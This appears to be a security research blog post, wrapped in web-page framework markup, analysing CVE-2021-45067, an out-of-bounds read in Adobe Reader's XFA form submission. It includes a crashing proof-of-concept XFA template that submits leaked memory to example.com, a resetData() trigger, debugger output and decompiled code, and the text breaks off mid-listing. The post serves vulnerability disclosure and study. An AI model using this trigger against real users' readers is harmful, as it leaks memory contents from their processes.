@@ -1,0 +1,738 @@
+1:"$Sreact.fragment"
+2:"$Sreact.suspense"
+3:I[75989,["6874","static/chunks/6874-d043bc3669b11e48.js","2848","static/chunks/2848-76b38e6c317c0e54.js","1966","static/chunks/1966-a068e5746165fd6d.js","2467","static/chunks/2467-7c736c42c91fb3af.js","214","static/chunks/214-845c2722ecb73b86.js","7177","static/chunks/app/layout-f709b6a7dd5adbfc.js"],"GoogleAnalytics"]
+4:I[29093,["6874","static/chunks/6874-d043bc3669b11e48.js","2848","static/chunks/2848-76b38e6c317c0e54.js","1966","static/chunks/1966-a068e5746165fd6d.js","2467","static/chunks/2467-7c736c42c91fb3af.js","214","static/chunks/214-845c2722ecb73b86.js","7177","static/chunks/app/layout-f709b6a7dd5adbfc.js"],"PageLoadWrapper"]
+5:I[2148,["6874","static/chunks/6874-d043bc3669b11e48.js","2848","static/chunks/2848-76b38e6c317c0e54.js","1966","static/chunks/1966-a068e5746165fd6d.js","2467","static/chunks/2467-7c736c42c91fb3af.js","214","static/chunks/214-845c2722ecb73b86.js","7177","static/chunks/app/layout-f709b6a7dd5adbfc.js"],"Header"]
+6:I[87555,[],""]
+7:I[31295,[],""]
+8:I[32876,["6874","static/chunks/6874-d043bc3669b11e48.js","2848","static/chunks/2848-76b38e6c317c0e54.js","4345","static/chunks/app/not-found-cbc74e2537bbd3aa.js"],"default"]
+9:I[6874,["6874","static/chunks/6874-d043bc3669b11e48.js","2848","static/chunks/2848-76b38e6c317c0e54.js","1966","static/chunks/1966-a068e5746165fd6d.js","2467","static/chunks/2467-7c736c42c91fb3af.js","214","static/chunks/214-845c2722ecb73b86.js","7177","static/chunks/app/layout-f709b6a7dd5adbfc.js"],""]
+c:I[59665,[],"MetadataBoundary"]
+e:I[59665,[],"OutletBoundary"]
+11:I[74911,[],"AsyncMetadataOutlet"]
+13:I[59665,[],"ViewportBoundary"]
+15:I[26614,[],""]
+:HL["/_next/static/media/569ce4b8f30dc480-s.p.woff2","font",{"crossOrigin":"","type":"font/woff2"}]
+:HL["/_next/static/media/93f479601ee12b01-s.p.woff2","font",{"crossOrigin":"","type":"font/woff2"}]
+:HL["/_next/static/media/d8804d28b3f5ce05-s.p.otf","font",{"crossOrigin":"","type":"font/otf"}]
+:HL["/_next/static/css/4dfd5a5264424a0f.css","style"]
+:HL["/_next/static/css/2a75dc013f3ed419.css","style"]
+:HL["/_next/static/css/09dfadb69bdaa005.css","style"]
+:HL["/_next/static/css/06fcfbe31f4b8e82.css","style"]
+a:T4ef,M20.317 4.3698a19.7913 19.7913 0 00-4.8851-1.5152.0741.0741 0 00-.0785.0371c-.211.3753-.4447.8648-.6083 1.2495-1.8447-.2762-3.68-.2762-5.4868 0-.1636-.3933-.4058-.8742-.6177-1.2495a.077.077 0 00-.0785-.037 19.7363 19.7363 0 00-4.8852 1.515.0699.0699 0 00-.0321.0277C.5334 9.0458-.319 13.5799.0992 18.0578a.0824.0824 0 00.0312.0561c2.0528 1.5076 4.0413 2.4228 5.9929 3.0294a.0777.0777 0 00.0842-.0276c.4616-.6304.8731-1.2952 1.226-1.9942a.076.076 0 00-.0416-.1057c-.6528-.2476-1.2743-.5495-1.8722-.8923a.077.077 0 01-.0076-.1277c.1258-.0943.2517-.1923.3718-.2914a.0743.0743 0 01.0776-.0105c3.9278 1.7933 8.18 1.7933 12.0614 0a.0739.0739 0 01.0785.0095c.1202.099.246.1981.3728.2924a.077.077 0 01-.0066.1276 12.2986 12.2986 0 01-1.873.8914.0766.0766 0 00-.0407.1067c.3604.698.7719 1.3628 1.225 1.9932a.076.076 0 00.0842.0286c1.961-.6067 3.9495-1.5219 6.0023-3.0294a.077.077 0 00.0313-.0552c.5004-5.177-.8382-9.6739-3.5485-13.6604a.061.061 0 00-.0312-.0286zM8.02 15.3312c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9555-2.4189 2.157-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.9555 2.4189-2.1569 2.4189zm7.9748 0c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9554-2.4189 2.1569-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.946 2.4189-2.1568 2.4189Z0:{"P":null,"b":"gMyW5qIY4BG4upgCzpuGJ","p":"","c":["","blogs","adobe-reader-xfa-ansi-unicode-confusion-information-leak"],"i":false,"f":[[["",{"children":["blogs",{"children":[["slug","adobe-reader-xfa-ansi-unicode-confusion-information-leak","d"],{"children":["__PAGE__",{}]}]}]},"$undefined","$undefined",true],["",["$","$1","c",{"children":[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/4dfd5a5264424a0f.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}],["$","link","1",{"rel":"stylesheet","href":"/_next/static/css/2a75dc013f3ed419.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}]],["$","html",null,{"lang":"en","children":[["$","head",null,{"children":["$","$2",null,{"fallback":null,"children":["$","$L3",null,{}]}]}],["$","body",null,{"className":"__variable_5cfdac __variable_9a8899 __variable_45311c antialiased min-h-screen flex flex-col","children":["$","$2",null,{"fallback":null,"children":["$","$L4",null,{"children":[["$","$L5",null,{}],["$","main",null,{"className":"flex-grow container mx-auto pt-24 pb-20","children":["$","$L6",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L7",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":[["$","$L8",null,{}],[]],"forbidden":"$undefined","unauthorized":"$undefined"}]}],["$","footer",null,{"className":"fixed left-0 bottom-0 right-0 border-t border-primary/30 bg-background/95 backdrop-blur-sm py-2 px-2 sm:px-4 w-full z-10 print:relative","children":["$","div",null,{"className":"container mx-auto px-0","children":["$","div",null,{"className":"flex items-center justify-between w-full","children":[["$","div",null,{"className":"flex-1","children":["$","div",null,{"className":"text-xs sm:text-sm font-semibold bg-gradient-to-r from-primary/90 to-secondary/90 bg-clip-text text-transparent truncate","children":["© ",2025," ","HackSys Inc"]}]}],["$","div",null,{"className":"flex items-center gap-3 sm:gap-4 ml-4","children":[["$","$L9",null,{"href":"https://twitter.com/HackSysTeam","className":"text-muted-foreground hover:text-primary transition-all duration-200","aria-label":"Twitter","children":["$","svg",null,{"xmlns":"http://www.w3.org/2000/svg","width":"16","height":"16","className":"sm:w-[18px] sm:h-[18px]","viewBox":"0 0 24 24","fill":"currentColor","role":"img","aria-hidden":"true","children":[["$","title",null,{"children":"X"}],["$","path",null,{"d":"M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z"}]]}]}],["$","$L9",null,{"href":"https://github.com/hacksysteam","className":"text-muted-foreground hover:text-primary transition-all duration-200","aria-label":"GitHub","children":["$","svg",null,{"xmlns":"http://www.w3.org/2000/svg","width":"16","height":"16","className":"sm:w-[18px] sm:h-[18px]","viewBox":"0 0 24 24","fill":"currentColor","role":"img","aria-hidden":"true","children":[["$","title",null,{"children":"GitHub"}],["$","path",null,{"d":"M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"}]]}]}],["$","$L9",null,{"href":"https://www.facebook.com/HackSysTeam","className":"text-muted-foreground hover:text-primary transition-all duration-200","aria-label":"Facebook","children":["$","svg",null,{"xmlns":"http://www.w3.org/2000/svg","width":"16","height":"16","className":"sm:w-[18px] sm:h-[18px]","viewBox":"0 0 24 24","fill":"currentColor","role":"img","aria-hidden":"true","children":[["$","title",null,{"children":"Facebook"}],["$","path",null,{"d":"M9.101 23.691v-7.98H6.627v-3.667h2.474v-1.58c0-4.085 1.848-5.978 5.858-5.978.401 0 .955.042 1.468.103a8.68 8.68 0 0 1 1.141.195v3.325a8.623 8.623 0 0 0-.653-.036 26.805 26.805 0 0 0-.733-.009c-.707 0-1.259.096-1.675.309a1.686 1.686 0 0 0-.679.622c-.258.42-.374.995-.374 1.752v1.297h3.919l-.386 2.103-.287 1.564h-3.246v8.245C19.396 23.238 24 18.179 24 12.044c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.628 3.874 10.35 9.101 11.647Z"}]]}]}],["$","$L9",null,{"href":"https://discord.com/invite/ns32uNhaq7","className":"text-muted-foreground hover:text-primary transition-all duration-200","aria-label":"Discord","children":["$","svg",null,{"xmlns":"http://www.w3.org/2000/svg","width":"16","height":"16","className":"sm:w-[18px] sm:h-[18px]","viewBox":"0 0 24 24","fill":"currentColor","role":"img","aria-hidden":"true","children":[["$","title",null,{"children":"Discord"}],["$","path",null,{"d":"$a"}]]}]}]]}]]}]}]}]]}]}]}]]}]]}],{"children":["blogs",["$","$1","c",{"children":[null,["$","$L6",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L7",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]}],{"children":[["slug","adobe-reader-xfa-ansi-unicode-confusion-information-leak","d"],["$","$1","c",{"children":[null,["$","$L6",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L7",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]}],{"children":["__PAGE__",["$","$1","c",{"children":["$Lb",["$","$Lc",null,{"children":"$Ld"}],[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/09dfadb69bdaa005.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}],["$","link","1",{"rel":"stylesheet","href":"/_next/static/css/06fcfbe31f4b8e82.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}]],["$","$Le",null,{"children":["$Lf","$L10",["$","$L11",null,{"promise":"$@12"}]]}]]}],{},null,false]},null,false]},null,false]},null,false],["$","$1","h",{"children":[null,["$","$1","6kr8cIBHiWPJLp4aoLX9J",{"children":[["$","$L13",null,{"children":"$L14"}],["$","meta",null,{"name":"next-size-adjust","content":""}]]}],null]}],false]],"m":"$undefined","G":["$15","$undefined"],"s":false,"S":true}
+16:I[74911,[],"AsyncMetadata"]
+18:I[88793,["7330","static/chunks/d3ac728e-41fcba63e1ac6655.js","5661","static/chunks/e0368f7a-1235c34447e61195.js","6874","static/chunks/6874-d043bc3669b11e48.js","2848","static/chunks/2848-76b38e6c317c0e54.js","1966","static/chunks/1966-a068e5746165fd6d.js","1456","static/chunks/1456-5cbd6dd70e2edd95.js","6877","static/chunks/6877-676b4dd2ee485b26.js","7882","static/chunks/7882-5f5fc3a912ab1310.js","3744","static/chunks/app/blogs/%5Bslug%5D/page-0492cfdbe1b5efd7.js"],"HeroSection"]
+19:I[750,["7330","static/chunks/d3ac728e-41fcba63e1ac6655.js","5661","static/chunks/e0368f7a-1235c34447e61195.js","6874","static/chunks/6874-d043bc3669b11e48.js","2848","static/chunks/2848-76b38e6c317c0e54.js","1966","static/chunks/1966-a068e5746165fd6d.js","1456","static/chunks/1456-5cbd6dd70e2edd95.js","6877","static/chunks/6877-676b4dd2ee485b26.js","7882","static/chunks/7882-5f5fc3a912ab1310.js","3744","static/chunks/app/blogs/%5Bslug%5D/page-0492cfdbe1b5efd7.js"],"default"]
+d:["$","$2",null,{"fallback":null,"children":["$","$L16",null,{"promise":"$@17"}]}]
+1a:T9248,
+## Overview
+
+PDF readers are the most widely used software suites used by millions of people across the globe for reviewing and editing PDF files. Over the last 2 decades, adversaries have targeted popular PDF readers such as Adobe Acrobat Reader to compromise the security and privacy of users. Last year we spent a considerable amount of effort to assess such widely used PDF readers including **Adobe Acrobat**, **Foxit PDF Reader**, and **PDFium**. Multiple exploitable vulnerabilities were discovered and reported in **Adobe** and **Foxit PDF Reader**. In this blog post series, we will share insights into our bug-hunting process, vulnerability details, and exploitation methods.
+
+In the first part of the series, we are sharing details about the first partially exploitable bug we found in Adobe Reader by fuzzing XFA. This bug was `Out of Bounds Read` caused by treating `ANSI` string as `Unicode` which we exploited to leak sensitive information from the sandboxed adobe reader process.
+
+## Background
+
+**Adobe XFA** (**XML Form Architecture**) provides functionality to support dynamic form manipulation inside adobe documents with the help of proprietary XML specification and javascript APIs. XFA allows us to dynamically manipulate PDF forms and layouts within PDF documents. Javascript APIs and XFA functionality had been the source of various memory corruption vulnerabilities (as well as logic bugs) in the past. After studying various sources of public reports on such vulnerabilities, we decided to get our hands dirty by fuzzing the javascript and XML parts. This was the first bug that we discovered shortly after we started developing and testing our internal fuzzer.
+
+## Advisory
+
+- [CVE-2021-45067](/advisories/HI-2021-002)
+
+## Testbed
+
+- Host OS: **Windows 10 Pro 20H2 19042.804**
+- Product: **Adobe Reader DC x64 2021.007.20095**
+- Product URL: <https://get.adobe.com/reader/otherversions/>
+
+## Proof of Concept
+
+Below given is a specially crafted **XML** inside a PDF document that crashes the **Adobe Reader** process.
+
+```xml
+<template>
+    <subform name="subform0">
+        <pageSet>
+            <pageArea>
+                <contentArea />
+            </pageArea>
+        </pageSet>
+        <field>
+            <ui>
+                <checkButton />
+            </ui>
+            <value>
+                <float> 1872560676325559.1 </float>
+            </value>
+        </field>
+        <field id="clickMe" name="clickMe" w="4" h="4" x="4" y="4">
+            <ui>
+                <imageEdit />
+            </ui>
+            <event activity="mouseUp">
+                <submit format="formdata" target="http://example.com/" textEncoding="UTF-16"></submit>
+            </event>
+        </field>
+    </subform>
+</template>
+```
+
+## Crash State
+
+```
+(1884.2114): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+AcroForm!crash_sub_20A49980+0x137:
+00000000`61609ab7 8a01            mov     al,byte ptr [rcx] ds:0000016d`c8682000=??
+0:000> r
+rax=00000000000015d0 rbx=0000016dc8681fe0 rcx=0000016dc8682000
+rdx=0000000000000020 rsi=0000003a97bfccb0 rdi=000000000000005f
+rip=0000000061609ab7 rsp=0000003a97bfc680 rbp=0000000000000000
+ r8=00000000000000d0  r9=00007ffc68550000 r10=0000003a97bfc336
+r11=0000003a97bfc71c r12=000000000000ffff r13=0000003a97bfccb0
+r14=0000000000000000 r15=0000000000000001
+iopl=0         nv up ei pl nz ac pe nc
+cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010212
+AcroForm!crash_sub_20A49980+0x137:
+00000000`61609ab7 8a01            mov     al,byte ptr [rcx] ds:0000016d`c8682000=??
+
+0:000> dc @rcx
+0000016d`c8682000  ???????? ???????? ???????? ????????  ????????????????
+0000016d`c8682010  ???????? ???????? ???????? ????????  ????????????????
+0000016d`c8682020  ???????? ???????? ???????? ????????  ????????????????
+```
+
+We can see the cause of the crash is due to the `rcx` register pointing to invalid memory. A quick check with `!heap` command showed us the memory address pointed by `rcx` is in fact in busy allocation with a user-allocated size of `0x16` bytes. This indicates that somehow adobe reader tried to read beyond the allocated buffer.
+
+## Heap Operation
+
+```
+0:000> !heap -p -a @rcx
+    address 0000016dc8682000 found in
+    _DPH_HEAP_ROOT @ 16debbe1000
+    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)
+                             16dc7283340:      16dc8681fe0               16 -      16dc8681000             2000
+          unknown!printable
+    00007ffc6ad2867b ntdll!RtlDebugAllocateHeap+0x000000000000003b
+    00007ffc6ac5d255 ntdll!RtlpAllocateHeap+0x00000000000000f5
+    00007ffc6ac5b44d ntdll!RtlpAllocateHeapInternal+0x0000000000000a2d
+    00007ffc6855fde6 ucrtbase!_malloc_base+0x0000000000000036
+    000000006141d4c1 AcroForm!ASSureMalloc+0x0000000000000015
+    0000000061607899 AcroForm!string_alloc_copy_ret_addr_sub_20A477E4+0x00000000000000b5
+    00000000616099cc AcroForm!crash_sub_20A49980+0x000000000000004c
+    0000000061601a88 AcroForm!sub_20A41150+0x0000000000000938
+    000000006167f4e4 AcroForm!sub_20ABF354+0x0000000000000190
+    0000000061602372 AcroForm!ExportAsHtml+0x00000000000002d6
+    000000006161fff2 AcroForm!AFSubmitIt+0x0000000000001a1a
+    00000000617c9e5d AcroForm!sub_20C09860+0x00000000000005fd
+    0000000061afc027 AcroForm!SubmitDispatcher__dispatch+0x00000000000007d7
+    0000000061bcb1da AcroForm!sub_2100B170+0x000000000000006a
+    0000000061bcb96e AcroForm!XFAEventManager__eventOccurred+0x00000000000006fe
+    0000000061ae8948 AcroForm!XFAFormModelImpl__execEvent+0x00000000000001f4
+    0000000061ae8633 AcroForm!XFAFormModelImpl__eventOccurred+0x0000000000000083
+    0000000061ae8729 AcroForm!XFAFormModelImpl__eventOccurred_0+0x0000000000000095
+    000000006179ba56 AcroForm!piDocumentContext__eventOccurred+0x0000000000000162
+    000000006173bc5e AcroForm!sub_20B7B1F8+0x0000000000000a66
+    000000006173b1f2 AcroForm!sub_20B7B1C0+0x0000000000000032
+    00000000638c2b60 Acrobat!AIDE::PixelPartInfo::PixelPartInfo+0x000000000083d950
+    00000000638c4df5 Acrobat!AIDE::PixelPartInfo::PixelPartInfo+0x000000000083fbe5
+    00000000638c2c5a Acrobat!AIDE::PixelPartInfo::PixelPartInfo+0x000000000083da4a
+    00000000638c4ee3 Acrobat!AIDE::PixelPartInfo::PixelPartInfo+0x000000000083fcd3
+    0000000063248250 Acrobat!AIDE::PixelPartInfo::PixelPartInfo+0x00000000001c3040
+    00000000633eda0c Acrobat!AIDE::PixelPartInfo::PixelPartInfo+0x00000000003687fc
+    00000000631dfaeb Acrobat!AIDE::PixelPartInfo::PixelPartInfo+0x000000000015a8db
+    00000000631e0068 Acrobat!AIDE::PixelPartInfo::PixelPartInfo+0x000000000015ae58
+    00000000631df8b0 Acrobat!AIDE::PixelPartInfo::PixelPartInfo+0x000000000015a6a0
+    000000006329ce57 Acrobat!AIDE::PixelPartInfo::PixelPartInfo+0x0000000000217c47
+    00000000635c454a Acrobat!AIDE::PixelPartInfo::PixelPartInfo+0x000000000053f33a
+```
+
+## Disassembly Around Crash
+
+```
+0:000> ub @eip
+AcroForm!crash_sub_20A49980+0x119:
+00000000`61609a99 66413bc4        cmp     ax,r12w
+00000000`61609a9d 750c            jne     AcroForm!crash_sub_20A49980+0x12b (00000000`61609aab)
+00000000`61609a9f 488d0d0ae99c00  lea     rcx,[AcroForm!utf_16_K (00000000`61fd83b0)]
+00000000`61609aa6 e82150e1ff      call    AcroForm!CLazyAtom::operator unsigned short(void) (00000000`6141eacc)
+00000000`61609aab 488bcb          mov     rcx,rbx
+00000000`61609aae 66394644        cmp     word ptr [rsi+44h],ax
+00000000`61609ab2 7520            jne     AcroForm!crash_sub_20A49980+0x154 (00000000`61609ad4)
+00000000`61609ab4 418bd6          mov     edx,r14d
+```
+
+After quick checking of the backtrace and reversing the relevant context of the crash, we can see that the crash is happening while exporting form data as HTML during the processing of the form **submit event**.
+
+```
+0:000> kc
+ # Call Site
+00 AcroForm!crash_sub_20A49980
+01 AcroForm!sub_20A41150
+02 AcroForm!sub_20ABF354
+03 AcroForm!ExportAsHtml
+04 AcroForm!AFSubmitIt
+05 AcroForm!sub_20C09860
+06 AcroForm!SubmitDispatcher__dispatch
+07 AcroForm!sub_2100B170
+08 AcroForm!XFAEventManager__eventOccurred
+09 AcroForm!XFAFormModelImpl__execEvent
+0a AcroForm!XFAFormModelImpl__eventOccurred
+0b AcroForm!XFAFormModelImpl__eventOccurred_0
+0c AcroForm!piDocumentContext__eventOccurred
+0d AcroForm!sub_20B7B1F8
+0e AcroForm!sub_20B7B1C0
+0f Acrobat!AIDE::PixelPartInfo::PixelPartInfo+0x83d950
+```
+
+Within adobe reader, various extended functionality is implemented using plugins. Javascript part is implemented in `EScript.api` where as XFA and other form-related javascript handlers are implemented in `AcroForm.api`. As we can see the crash happens inside `AcroForm.api` module, below is the module information for the vulnerable version of the `AcroForm.api`.
+
+## Module Version
+
+```
+0:000> lmvm AcroForm
+Browse full module list
+start             end                 module name
+00000000`613c0000 00000000`62510000   AcroForm   (pdb symbols)          c:\symbols\Acroform.pdb\83D2EC4EBDEC48278E9F0B0C633870092\Acroform.pdb
+    Loaded symbol image file: C:\Program Files\Adobe\Acrobat DC\Acrobat\plug_ins\AcroForm.api
+    Image path: C:\Program Files\Adobe\Acrobat DC\Acrobat\plug_ins\AcroForm.api
+    Image name: AcroForm.api
+    Browse all global symbols  functions  data
+    Timestamp:        Fri Sep 24 21:14:39 2021 (614EA22F)
+    CheckSum:         01115197
+    ImageSize:        01150000
+    File version:     21.7.20095.60881
+    Product version:  21.7.20095.60881
+    File flags:       0 (Mask 3F)
+    File OS:          4 Unknown Win32
+    File type:        2.0 Dll
+    File date:        00000000.00000000
+    Translations:     0409.04b0
+    Information from resource tables:
+        CompanyName:      Adobe Systems Incorporated
+        ProductName:      Adobe Acrobat Forms
+        InternalName:     AcroForm
+        OriginalFilename: AcroForm.api
+        ProductVersion:   21.7.20095.454097
+        FileVersion:      21.7.20095.454097
+        FileDescription:  Adobe Acrobat Forms Plug-In
+        LegalCopyright:   Copyright 1984-2021 Adobe Systems Incorporated and its licensors. All rights reserved.
+        LegalTrademarks:  Adobe, Acrobat and the Acrobat logo are trademarks of Adobe Systems Incorporated which may be registered in certain jurisdictions.
+        Comments:         The Acrobat Forms plug-in allows users to create dynamic electronic forms for fill-in and transmittal.
+```
+
+## Root Cause Analysis
+
+The crash occurs while dereferencing `rcx` register while executing `mov al, byte ptr [rcx]` instruction. Let's check the value of `rcx`.
+
+```
+0:000> r @rcx
+rcx=0000016dc8682000
+
+0:000> dc @rcx-20
+0000016d`c8681fe0  37382c31 36352c32 37362c30 32332c36  1,872,560,676,32
+0000016d`c8681ff0  35352c35 d0d00039 d0d0d0d0 d0d0d0d0  5,559...........
+0000016d`c8682000  ???????? ???????? ???????? ????????  ????????????????
+0000016d`c8682010  ???????? ???????? ???????? ????????  ????????????????
+0000016d`c8682020  ???????? ???????? ???????? ????????  ????????????????
+0000016d`c8682030  ???????? ???????? ???????? ????????  ????????????????
+0000016d`c8682040  ???????? ???????? ???????? ????????  ????????????????
+0000016d`c8682050  ???????? ???????? ???????? ????????  ????????????????
+```
+
+Let's see the faulting **XFA XDP** packet.
+
+```xml
+<template>
+    <subform name="subform0">
+        <pageSet>
+            <pageArea>
+                <contentArea />
+            </pageArea>
+        </pageSet>
+        <field>
+            <ui>
+                <checkButton />
+            </ui>
+            <value>
+                <float> 1872560676325559.1 </float>
+            </value>
+        </field>
+        <field id="clickMe" name="clickMe" w="4" h="4" x="4" y="4">
+            <ui>
+                <imageEdit />
+            </ui>
+            <event activity="mouseUp">
+                <submit format="formdata" target="http://example.com/" textEncoding="UTF-16"></submit>
+            </event>
+        </field>
+    </subform>
+</template>
+```
+
+In `rcx` dump we see `1,872,560,676,325,559` which is the string representation of `<float>` value `1872560676325559.1` of xfa field. One key thing to notice in `rcx` dump is that it's stored as `ANSI`. As mentioned earlier, the bug is **Out-Of-Bound Read** as function `crash_sub_20A49980` tried to read beyond allocated buffer while processing float value.
+
+> Note: See the allocation stack trace
+
+This vulnerability only gets triggered when the user clicks on the **form** and `mouseUp` event is triggered which submits the form to the defined target URL `target="http://example.com/"`. One more additional factor for **Adobe Reader** to take the vulnerable path is that **XFA** data should already be in the **reset** state. This could be achieved by the below-given javascript.
+
+```js
+xfa.host.resetData();
+```
+
+Now the question is why `rcx` register value was **out-of-bounds**. For this, let's see the decompiled code of the crashing function.
+
+```c
+void __fastcall crash_sub_20A49980(__int64 this, __int64 someStackBuff, char *somExpression, __int64 a4)
+{
+  __int16 v6; // bp
+  char *newStrBuff; // rbx
+  __int16 textEncoding; // ax
+  char *lsomExpression; // rcx
+  int i; // edx
+  char currentSOMCharVal; // al
+  char *nextSOMChar; // rcx
+  char nextSOMCharVal; // r8
+  int strLength; // eax
+  __int16 maxSOMExprLength; // ax
+  __int16 maxNewStrLength; // di
+  __int16 textEncoding_1; // ax
+  char *lnewStrBuff; // rcx
+  int j; // edx
+  char currentCharVal; // al
+  char *nextChar; // rcx
+  char nextCharVal; // r8
+  int newStrLength; // eax
+  __int64 v24; // [rsp+0h] [rbp-498h] BYREF
+  __int16 v25; // [rsp+30h] [rbp-468h] BYREF
+  char *v26; // [rsp+38h] [rbp-460h]
+  char outputBuffer[1040]; // [rsp+40h] [rbp-458h] BYREF
+  __int64 v28; // [rsp+450h] [rbp-48h]
+
+  v6 = 0;
+  newStrBuff = string_alloc_copy_ret_addr_sub_20A477E4(
+                 this,
+                 someStackBuff,
+                 (__int64)somExpression,
+                 a4,
+                 (void (__fastcall *)(__int64, __int64, __int64, __int64, int))crash_sub_20A49980,
+                 &v25);  // allocates and copies the float field string representation
+                         // as ANSI and then return the address of newly copied string
+                         //
+                         // 0000016F`142E9FE0  31 2C 38 37 32 2C 35 36 30 2C 36 37 36 2C 33 32  1,872,560,676,32
+                         // 0000016F`142E9FF0  35 2C 35 35 39 00 D0 D0 D0 D0 D0 D0 D0 D0 D0 D0  5,559...........
+                         // 0000016F`142EA000  ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??  ................
+                         //
+  v26 = newStrBuff;
+  if ( !v25 )
+  {
+    if ( (*(unsigned int (__fastcall **)(_QWORD))(gAcroSupportHFT + 248))(*(_QWORD *)(someStackBuff + 40)) )
+    {
+      outputBuffer[0] = '&';
+      v6 = 1;
+    }
+    textEncoding = utf_16_K;
+    if ( utf_16_K == -1 )
+      textEncoding = CLazyAtom::operator unsigned short((__int64)&utf_16_K);
+    lsomExpression = somExpression;
+    if ( *(_WORD *)(someStackBuff + 68) == textEncoding )
+    {
+      for ( i = 0; ; i += 2 )
+      {
+        currentSOMCharVal = *lsomExpression;
+        nextSOMChar = lsomExpression + 1;
+        nextSOMCharVal = *nextSOMChar;
+        lsomExpression = nextSOMChar + 1;
+        if ( !currentSOMCharVal && !nextSOMCharVal )
+          break;
+      }
+      strLength = i;
+    }
+    else
+    {
+      strLength = ASstrnlen_safe(somExpression, 0x7FFFFFFFui64, 0i64);
+    }
+    maxSOMExprLength = url_encode(
+                         *(_QWORD *)(someStackBuff + 40),
+                         (__int64)outputBuffer,
+                         v6,
+                         (unsigned __int8 *)somExpression,
+                         strLength);
+    maxNewStrLength = maxSOMExprLength;
+    if ( maxSOMExprLength < 1026 )
+    {
+      outputBuffer[maxSOMExprLength] = '=';
+      maxNewStrLength = maxSOMExprLength + 1;
+    }
+    if ( newStrBuff )
+    {
+      textEncoding_1 = utf_16_K;
+      if ( utf_16_K == -1 )
+        textEncoding_1 = CLazyAtom::operator unsigned short((__int64)&utf_16_K);
+      lnewStrBuff = newStrBuff;
+      if ( *(_WORD *)(someStackBuff + 68) == textEncoding_1 )
+      {
+        for ( j = 0; ; j += 2 )
+        {                                 // miUCSStrlen_safe
+          currentCharVal = *lnewStrBuff;  // crashes here. this is trying to find the length of UTF-16 string
+                                          // but the actual allocated string is UTF-8
+          nextChar = lnewStrBuff + 1;
+          nextCharVal = *nextChar;
+          lnewStrBuff = nextChar + 1;
+          if ( !currentCharVal && !nextCharVal )
+            break;
+        }
+        newStrLength = j;
+      }
+      else
+      {
+        newStrLength = ASstrnlen_safe(newStrBuff, 0x7FFFFFFFui64, 0i64);
+      }
+      maxNewStrLength = url_encode(
+                          *(_QWORD *)(someStackBuff + 40),
+                          (__int64)outputBuffer,
+                          maxNewStrLength,
+                          (unsigned __int8 *)newStrBuff,
+                          newStrLength);  // this OOB data is leaked to remote server
+    }
+    if ( maxNewStrLength > 0 )
+      (*(void (__fastcall **)(_QWORD, char *, _QWORD))(gAcroSupportHFT + 280))(
+        *(_QWORD *)(someStackBuff + 40),
+        outputBuffer,
+        (unsigned int)maxNewStrLength);
+  }
+  if ( newStrBuff )
+    (*(void (__fastcall **)(char *))(gAcroSupportHFT + 24))(newStrBuff);
+  some_sec_cookie_sub_21064BF0((unsigned __int64)&v24 ^ v28);
+}
+```
+
+We can see in the above function that `string_alloc_copy_ret_addr_sub_20A477E4` is responsible for making a copy of the already allocated string representation of the `<float>` value. The new buffer is allocated and the string representation is copied by treating the buffer as `ANSI` as you can see in the `rcx` dump.
+
+Let's see the code of `string_alloc_copy_ret_addr_sub_20A477E4` for a better understanding of what it's doing.
+
+```c
+char *__fastcall string_alloc_copy_ret_addr_sub_20A477E4(
+        __int64 this,
+        __int64 a2,
+        __int64 somExpression,
+        __int64 a4,
+        void (__fastcall *callback)(__int64, __int64, __int64, __int64, int),
+        _WORD *a6)
+{
+  char *v10; // rdi
+  _WORD *v11; // r13
+  int ret; // eax
+  __int64 v13; // rdi
+  unsigned __int16 v14; // ax
+  _BYTE *srcBuff; // rbx
+  int v16; // eax
+  char *dst; // rax
+  int v18; // er14
+  __int64 v19; // rax
+  __int64 v21; // rax
+  int *v22; // rbx
